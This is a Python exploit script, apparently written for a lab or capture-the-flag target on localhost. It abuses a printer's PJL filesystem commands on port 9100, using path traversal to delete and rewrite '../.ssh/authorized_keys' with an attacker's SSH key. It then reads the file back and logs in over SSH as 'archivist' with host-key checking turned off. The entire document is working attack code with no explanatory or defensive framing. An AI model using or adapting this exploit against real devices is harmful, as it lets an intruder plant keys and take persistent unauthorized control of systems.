#!/usr/bin/env python3
import socket, subprocess
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
for PATH in ("../.ssh/authorized_keys", "0:../.ssh/authorized_keys"):
    N = len(KEY)
    s = socket.socket(); s.settimeout(15); s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n'); print(PATH, "mk", s.recv(128))
    s.sendall(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode()); print("del", s.recv(128))
    s.sendall(f'@PJL FSAPPEND NAME="{PATH}"\r\n'.encode()); print("an", s.recv(128))
    s.sendall(f"SIZE={N}\r\n".encode()); print("sz", s.recv(128))
    s.sendall(KEY)
    try: print("bd", s.recv(128))
    except: print("bd T")
    s.close()
    s2 = socket.socket(); s2.settimeout(5); s2.connect(("127.0.0.1", 9100))
    s2.sendall(f'@PJL FSUPLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode())
    print("rb", repr(s2.recv(512)))
    s2.close()
cp = subprocess.run(["ssh","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-i","/tmp/id_ed25519","archivist@127.0.0.1","id"], capture_output=True, text=True, timeout=10)
print("ssh", cp.returncode, cp.stdout, cp.stderr[:120])